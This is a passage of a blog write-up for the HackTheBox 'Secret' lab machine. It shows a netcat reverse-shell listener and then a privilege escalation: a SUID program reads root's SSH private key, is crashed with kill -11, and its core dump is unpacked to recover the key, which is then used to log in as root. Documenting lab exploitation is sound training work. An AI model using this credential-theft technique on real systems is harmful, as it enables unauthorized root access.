</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7417</span> suspended  nc -nvlp <span class=m>88</span>
</span></span><span class=line><span class=cl>→ kali@kali «~» «10.10.14.28»
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7417</span> continued  nc -nvlp <span class=m>88</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>dasith@secret:~/local-web$
</span></span></code></pre></div><p>The user flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:~$ cat user.txt
</span></span><span class=line><span class=cl>c95a3f...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Doing a recursive search with the <code>find</code> command reveal a crash file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/opt$ find / -type f -user dasith 2&gt;/dev/null <span class=p>|</span> grep -v <span class=s1>&#39;proc\|\.npm\|local-web&#39;</span>
</span></span><span class=line><span class=cl>/var/crash/_opt_count.1000.crash
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>That naming lead me to <code>/opt</code>, where I find a C code, a binary, and a log file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/$ ls /opt/
</span></span><span class=line><span class=cl>code.c  count  valgrind.log
</span></span><span class=line><span class=cl>dasith@secret:/$ <span class=nb>cd</span> /opt/
</span></span><span class=line><span class=cl>dasith@secret:/opt$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>56</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root  <span class=m>4096</span> Oct  <span class=m>7</span> 10:06 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>20</span> root root  <span class=m>4096</span> Oct  <span class=m>7</span> 15:01 ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>3736</span> Oct  <span class=m>7</span> 10:01 code.c
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root <span class=m>16384</span> Oct  <span class=m>7</span> 10:01 .code.c.swp
</span></span><span class=line><span class=cl>-rwsr-xr-x  <span class=m>1</span> root root <span class=m>17824</span> Oct  <span class=m>7</span> 10:03 count
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>4622</span> Oct  <span class=m>7</span> 10:04 valgrind.log
</span></span></code></pre></div><p>The binary drews my attention because it has SUID bit.</p><p>When I run it, it asks for a file/directory and when it finishes, I&rsquo;m given with an option to save the results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/opt$ ./count
</span></span><span class=line><span class=cl>Enter <span class=nb>source</span> file/directory name: /root/root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Total <span class=nv>characters</span> <span class=o>=</span> <span class=m>33</span>
</span></span><span class=line><span class=cl>Total <span class=nv>words</span>      <span class=o>=</span> <span class=m>2</span>
</span></span><span class=line><span class=cl>Total <span class=nv>lines</span>      <span class=o>=</span> <span class=m>2</span>
</span></span><span class=line><span class=cl>Save results a file? <span class=o>[</span>y/N<span class=o>]</span>: y
</span></span><span class=line><span class=cl>Path: /tmp/test
</span></span><span class=line><span class=cl>dasith@secret:/opt$ cat /tmp/test
</span></span><span class=line><span class=cl>Total <span class=nv>characters</span> <span class=o>=</span> <span class=m>33</span>
</span></span><span class=line><span class=cl>Total <span class=nv>words</span>      <span class=o>=</span> <span class=m>2</span>
</span></span><span class=line><span class=cl>Total <span class=nv>lines</span>      <span class=o>=</span> <span class=m>2</span>
</span></span></code></pre></div><p>From here, I&rsquo;ll look into the C code.</p><h4 id=source-code-analysis-1>Source Code Analysis<a class=anchor aria-hidden=true href=#source-code-analysis-1>#</a></h4><p>Since the rests isn&rsquo;t that important, I&rsquo;ll start from the main function.</p><p>In the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: <code>dircount</code> if the input is a directory and <code>filecount</code> if the input is a file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>path</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>stat</span> <span class=n>path_s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>summary</span><span class=p>[</span><span class=mi>4096</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter source file/directory name: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%99s&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>stat</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>path_s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>S_ISDIR</span><span class=p>(</span><span class=n>path_s</span><span class=p>.</span><span class=n>st_mode</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nf>dircount</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>summary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nf>filecount</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>summary</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...[</span><span class=n>SNIP</span><span class=p>]...</span>
</span></span></code></pre></div><p>The next thing this program do is dropping the root privilege to normal user, and then it&rsquo;s forced to generate a <a href=https://en.wikipedia.org/wiki/Core_dump>core dump</a>. Lastly, it&rsquo;ll ask whether the user wants to save the result or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...[</span><span class=n>SNIP</span><span class=p>]...</span>
</span></span><span class=line><span class=cl>    <span class=c1>// drop privs to limit file write
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>setuid</span><span class=p>(</span><span class=nf>getuid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Enable coredump generation
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_DUMPABLE</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Save results a file? [y/N]: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=mi>121</span> <span class=o>||</span> <span class=n>res</span> <span class=o>==</span> <span class=mi>89</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Path: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%99s&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s>&#34;a&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>fp</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>fputs</span><span class=p>(</span><span class=n>summary</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Could not open %s for writing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The key here is that, with core dump enabled (<code> prctl(PR_SET_DUMPABLE, 1)</code>), when the program crashes, the memory state of this program will be recorded and dumped to a crash file. That file is typically used for diagnosing the program fault.</p><h4 id=abuse-core-dump---force-crash>Abuse Core Dump - Force Crash<a class=anchor aria-hidden=true href=#abuse-core-dump---force-crash>#</a></h4><p>When I open a file like <code>/root/.ssh/id_rsa</code> in this program and if by accident it crashes, the content of that <code>id_rsa</code> will definitely got dumped into the crash file.</p><p>Now the question is, how to intentionally crash this program?</p><p>According to <a href=https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd>this post</a> on StackOverFlow, sending <code>kill -11</code> can trigger a crash on a program, which eventually produces a core dump.</p><p>First, I will open another sessions, so I have two in total. On the first session, I&rsquo;ll run the <code>count</code> program and keep it running in the result section.</p><pre tabindex=0><code>dasith@secret:/tmp/$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: y
Path: 
</code></pre><p>Then on the other session, you guess it, I will send a kill signal to crash the program.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/opt$ <span class=nb>kill</span> -11 <span class=k>$(</span>pidof count<span class=k>)</span>
</span></span></code></pre></div><p>It crashes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Enter <span class=nb>source</span> file/directory name: /root/.ssh/id_rsa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Total <span class=nv>characters</span> <span class=o>=</span> <span class=m>2602</span>
</span></span><span class=line><span class=cl>Total <span class=nv>words</span>      <span class=o>=</span> <span class=m>45</span>
</span></span><span class=line><span class=cl>Total <span class=nv>lines</span>      <span class=o>=</span> <span class=m>39</span>
</span></span><span class=line><span class=cl>Save results a file? <span class=o>[</span>y/N<span class=o>]</span>: y
</span></span><span class=line><span class=cl>Path: Killed
</span></span></code></pre></div><p>The crash file is generated under <code>/var/crash/</code>.</p><pre tabindex=0><code>dasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash
-rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash
</code></pre><p>The crash file can be <a href=https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash>unpacked</a> into a separate files using the <code>apport-unpack</code> utility, which also installed in this machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/tmp/$ mkdir .syncrst <span class=o>&amp;&amp;</span> apport-unpack /var/crash/_opt_count.1000.crash .syncrst
</span></span><span class=line><span class=cl>dasith@secret:/tmp/$ ls -la .syncrst
</span></span><span class=line><span class=cl>total <span class=m>440</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> dasith dasith   <span class=m>4096</span> Oct <span class=m>31</span> 08:43 .
</span></span><span class=line><span class=cl>drwxrwxrwt <span class=m>16</span> root   root     <span class=m>4096</span> Oct <span class=m>31</span> 08:25 ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith      <span class=m>5</span> Oct <span class=m>31</span> 08:43 Architecture
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith <span class=m>380928</span> Oct <span class=m>31</span> 08:43 CoreDump
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith      <span class=m>1</span> Oct <span class=m>31</span> 08:43 CrashCounter
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>24</span> Oct <span class=m>31</span> 08:43 Date
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>12</span> Oct <span class=m>31</span> 08:43 DistroRelease
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>10</span> Oct <span class=m>31</span> 08:43 ExecutablePath
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>10</span> Oct <span class=m>31</span> 08:43 ExecutableTimestamp
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith      <span class=m>5</span> Oct <span class=m>31</span> 08:43 ProblemType
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>10</span> Oct <span class=m>31</span> 08:43 ProcCmdline
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>10</span> Oct <span class=m>31</span> 08:43 ProcCwd
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>64</span> Oct <span class=m>31</span> 08:43 ProcEnviron
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith   <span class=m>2144</span> Oct <span class=m>31</span> 08:43 ProcMaps
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith   <span class=m>1343</span> Oct <span class=m>31</span> 08:43 ProcStatus
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith      <span class=m>2</span> Oct <span class=m>31</span> 08:43 Signal
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith     <span class=m>29</span> Oct <span class=m>31</span> 08:43 Uname
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> dasith dasith      <span class=m>3</span> Oct <span class=m>31</span> 08:43 UserGroups
</span></span></code></pre></div><p>The CoreDump file is the one that contains the <code>id_rsa</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:/tmp/$ cat .syncrst/CoreDump
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>□☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ<span class=sb>`</span>□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
</span></span><span class=line><span class=cl>KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
</span></span><span class=line><span class=cl>6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
</span></span><span class=line><span class=cl>xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
</span></span><span class=line><span class=cl><span class=nv>fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA</span><span class=o>==</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>With that key, I can SSH login as root and grab the root flag!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.28»
</span></span><span class=line><span class=cl>$ ssh -i coredump.ssh root@10.10.11.120
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.11.120 (10.10.11.120)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.11.120<span class=err>&#39;</span> <span class=o>(</span>ECDSA<span class=o>)</span> to the list of known hosts.
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-89-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Sun <span class=m>31</span> Oct <span class=m>2021</span> 08:16:22 AM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.0               Processes:             <span class=m>223</span>
</span></span><span class=line><span class=cl>  Usage of /:   52.8% of 8.79GB   Users logged in:       <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 20%               IPv4 address <span class=k>for</span> eth0: 10.10.11.120
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Sun Oct <span class=m>31</span> 07:47:50 <span class=m>2021</span> from 10.10.14.91
</span></span><span class=line><span class=cl>root@secret:~# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>root@secret:~# cat root.txt
</span></span><span class=line><span class=cl>d1d6d....<span class=o>[</span>SNIP<span class=o>]</span>....
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash>https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash</a></li><li><a href=https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd>https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd</a></li></ul></div></div></div><div class=post-meta-bottom></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/core-dump/>Core-dump</a></li><li><a href=https://fahmifj.github.io/tags/jwt/>JWT</a></li><li><a href=https://fahmifj.github.io/tags/go/>Go</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/git/>Git</a></li><li><a href=https://fahmifj.github.io/tags/code-analysis/>Code-analysis</a></li><li><a href=https://fahmifj.github.io/tags/suid/>SUID</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Secret&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f&amp;hashtags=Linux%2cCore-dump%2cJWT%2cGo%2cCommand-Injection%2cGit%2cCode-analysis%2cSUID"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f&amp;title=HackTheBox%20-%20Secret&amp;summary=HackTheBox%20-%20Secret&amp;source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f&title=HackTheBox%20-%20Secret"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Secret%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Secret on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Secret&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsecret%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 